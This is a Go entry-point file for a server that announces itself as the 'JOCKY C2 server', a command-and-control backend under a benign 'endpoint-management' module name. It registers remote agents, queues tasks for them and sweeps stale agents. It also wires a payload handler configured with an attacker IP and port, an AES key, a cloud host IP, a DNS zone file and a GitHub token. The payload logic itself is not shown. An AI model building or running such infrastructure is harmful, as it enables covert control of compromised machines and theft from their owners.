package main

import (
	"context"
	"log"
	"net/http"
	"os"
	"os/signal"
	"syscall"
	"time"

	"github.com/joho/godotenv"
	"github.com/redis/go-redis/v9"
	"golang.org/x/crypto/bcrypt"

	"endpoint-management-server/internal/config"
	"endpoint-management-server/internal/db"
	"endpoint-management-server/internal/handlers"
	"endpoint-management-server/internal/queue"
	"endpoint-management-server/internal/repository"
	"endpoint-management-server/internal/router"
)

func main() {
	_ = godotenv.Load()

	cfg, err := config.Load()
	if err != nil {
		log.Fatalf("config error: %v", err)
	}

	conn, err := db.Connect(cfg.PostgresDSN)
	if err != nil {
		log.Fatalf("postgres connection failed: %v", err)
	}
	defer conn.Close()

	redisClient := redis.NewClient(&redis.Options{
		Addr:         cfg.RedisAddr,
		Password:     cfg.RedisPassword,
		DB:           0,
		PoolSize:     100,
		MinIdleConns: 10,
	})
	defer redisClient.Close()

	ctx := context.Background()
	if err := redisClient.Ping(ctx).Err(); err != nil {
		log.Fatalf("redis connection failed: %v", err)
	}

	// Determine whether the Redis instance supports LMPOP (>= 7.0).
	useLMPOP, err := queue.CheckRedisVersion(ctx, redisClient)
	if err != nil {
		log.Printf("warning: could not check Redis version, disabling LMPOP: %v", err)
	}
	if useLMPOP {
		log.Println("Redis >= 7.0 detected — using LMPOP for atomic batch queue drain")
	} else {
		log.Println("Redis < 7.0 — using serial LPOP fallback")
	}

	// Build repositories.
	agentRepo     := repository.NewAgentRepository(conn)
	taskRepo      := repository.NewTaskRepository(conn)
	telemetryRepo := repository.NewTelemetryRepository(conn)
	auditRepo     := repository.NewAuditRepository(conn)
	operatorRepo  := repository.NewOperatorRepository(conn)
	dashRepo      := repository.NewDashboardRepository(conn)

	// Seed an admin operator on first boot if the operators table is empty.
	if err := seedAdminOperator(ctx, operatorRepo, cfg.AdminPassword); err != nil {
		log.Printf("admin seed warning: %v", err)
	}

	taskQueue := queue.NewTaskQueue(redisClient, useLMPOP)

	// Build handlers.
	agentHandler := handlers.NewAgentHandler(
		agentRepo, taskRepo, telemetryRepo, auditRepo, taskQueue, cfg.MaxRetries, cfg.BundlePath, redisClient,
	)
	operatorHandler := handlers.NewOperatorHandler(operatorRepo, auditRepo, cfg.OperatorSecret)
	payloadHandler  := handlers.NewPayloadHandler(
		redisClient, auditRepo,
		cfg.AESKey, cfg.EC2PublicIP, cfg.ZoneFilePath,
		cfg.WebhookSecret, cfg.AttackerIP, cfg.AttackerPort,
		cfg.GitHubToken,
	)
	dashboardHandler := handlers.NewDashboardHandler(dashRepo, auditRepo, redisClient)

	// Background goroutines.
	go staleAgentSweeper(agentRepo)
	go taskExpirySweeper(ctx, taskRepo, auditRepo)

	r := router.New(
		agentHandler, operatorHandler, payloadHandler, dashboardHandler,
		agentRepo, redisClient, cfg.OperatorSecret,
	)

	srv := &http.Server{
		Addr:              ":" + cfg.Port,
		Handler:           r,
		ReadHeaderTimeout: 5 * time.Second,
		ReadTimeout:       15 * time.Second,
		WriteTimeout:      15 * time.Second,
		IdleTimeout:       60 * time.Second,
	}

	go func() {
		log.Printf("JOCKY C2 server listening on :%s", cfg.Port)
		if err := srv.ListenAndServe(); err != nil && err != http.ErrServerClosed {
			log.Fatalf("server error: %v", err)
		}
	}()

	quit := make(chan os.Signal, 1)
	signal.Notify(quit, syscall.SIGINT, syscall.SIGTERM)
	<-quit

	log.Println("shutting down gracefully...")
	shutCtx, cancel := context.WithTimeout(context.Background(), 15*time.Second)
	defer cancel()
	if err := srv.Shutdown(shutCtx); err != nil {
		log.Fatalf("forced shutdown: %v", err)
	}
}

// seedAdminOperator creates the initial "admin" operator if none exist yet.
func seedAdminOperator(ctx context.Context, repo *repository.OperatorRepository, rawPassword string) error {
	n, err := repo.Count(ctx)
	if err != nil {
		return err
	}
	if n > 0 {
		return nil
	}
	hash, err := bcrypt.GenerateFromPassword([]byte(rawPassword), 12)
	if err != nil {
		return err
	}
	_, err = repo.Create(ctx, "admin", string(hash))
	if err != nil {
		return err
	}
	log.Println("seeded initial admin operator")
	return nil
}

// staleAgentSweeper marks agents offline when they haven't polled recently.
func staleAgentSweeper(agentRepo *repository.AgentRepository) {
	ticker := time.NewTicker(30 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		if n, err := agentRepo.MarkStaleOffline(ctx, 120); err != nil {
			log.Printf("stale sweeper error: %v", err)
		} else if n > 0 {
			log.Printf("marked %d agents offline", n)
		}
		cancel()
	}
}

// taskExpirySweeper marks expired tasks and writes an audit log entry for each.
func taskExpirySweeper(ctx context.Context, taskRepo *repository.TaskRepository, auditRepo *repository.AuditRepository) {
	ticker := time.NewTicker(60 * time.Second)
	defer ticker.Stop()
	for range ticker.C {
		sweepCtx, cancel := context.WithTimeout(ctx, 10*time.Second)
		expiredIDs, err := taskRepo.ExpireStale(sweepCtx)
		if err != nil {
			log.Printf("task expiry sweeper error: %v", err)
		}
		for _, id := range expiredIDs {
			tid := id
			_ = auditRepo.Write(sweepCtx, "task_expired", "task", &tid, "system", nil)
		}
		if len(expiredIDs) > 0 {
			log.Printf("expired %d stale tasks", len(expiredIDs))
		}
		cancel()
	}
}
